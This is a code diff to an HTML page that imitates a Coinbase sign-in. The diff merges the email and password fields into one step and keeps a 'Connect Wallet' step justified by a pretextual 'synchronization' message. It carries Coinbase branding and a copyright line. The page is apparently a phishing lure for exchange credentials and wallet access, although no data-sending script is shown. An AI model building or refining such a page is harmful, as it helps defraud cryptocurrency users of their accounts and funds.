@@ -66,64 +66,64 @@
         input {
             width: 100%;
             padding: 12px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             border: 1px solid var(--cb-border);
             border-radius: 8px;
             box-sizing: border-box;
             font-family: 'Inter';
         }
         .footer {
-            margin-top: 30px;
+            margin-top: 40px;
             font-size: 11px;
             color: #9ca3af;
-            line-height: 1.4;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
         }
+        .footer a { color: #9ca3af; text-decoration: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
         
-        <!-- STEP 1: LANDING -->
+        <!-- STEP 1: Landing -->
         <div id="step-1" class="auth-card">
             <div class="cb-logo">
                 <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
             <h1>Coinbase</h1>
-            <p>Securely manage your digital assets. Ensure your holdings are up to date with the latest network synchronization.</p>
+            <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
             <button id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- STEP 2: EMAIL -->
+        <!-- STEP 2: Email & Password (Combined) -->
         <div id="step-2" class="auth-card hidden">
-            <h1 style="font-size: 20px;">Sign In</h1>
-            <p>Enter your email to access your account.</p>
-            <input type="email" id="email" placeholder="Email Address">
-            <button id="toStep3" class="btn-primary">Continue</button>
-        </div>
-
-        <!-- STEP 3: PASSWORD -->
-        <div id="step-3" class="auth-card hidden">
-            <h1 style="font-size: 20px;">Password</h1>
-            <p>Enter your password to verify ownership.</p>
-            <input type="password" id="pass" placeholder="Password">
-            <button id="toStep4" class="btn-primary">Continue</button>
-        </div>
-
-        <!-- STEP 4: WALLET CONNECT -->
-        <div id="step-4" class="auth-card hidden">
             <div class="cb-logo">
                 <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
-            <h1>Account Verified</h1>
-            <p>A network update is required to maintain access to your assets. Please connect your wallet to synchronize.</p>
+            <h1>Sign In</h1>
+            <p>Please enter your account credentials.</p>
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="password" id="pass" placeholder="Password">
+            <button id="toStep3" class="btn-primary">Continue</button>
+        </div>
+
+        <!-- STEP 3: Wallet Connect -->
+        <div id="step-3" class="auth-card hidden">
+            <div class="cb-logo">
+                <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+            </div>
+            <h1>Secure Connection</h1>
+            <p>Your account is verified. To complete the synchronization, please connect your Coinbase Wallet.</p>
             <button id="connectBtn" class="btn-primary">Connect Wallet</button>
-            <div id="status" style="margin-top: 15px; color: var(--cb-blue); font-size: 13px;"></div>
+            <div id="status" style="margin-top: 20px; color: var(--cb-blue); font-size: 14px;"></div>
         </div>
 
         <div class="footer">
-            © 2026 Coinbase, Inc. | <a href="#" style="color: #9ca3af;">Privacy</a> | <a href="#" style="color: #9ca3af;">Terms</a>
-            <div style="margin-top: 10px; font-weight: 700;">🔒 SECURED BY BANK-GRADE ENCRYPTION</div>
+            <span>© 2026 Coinbase, Inc.</span>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
         </div>
     </div>
 
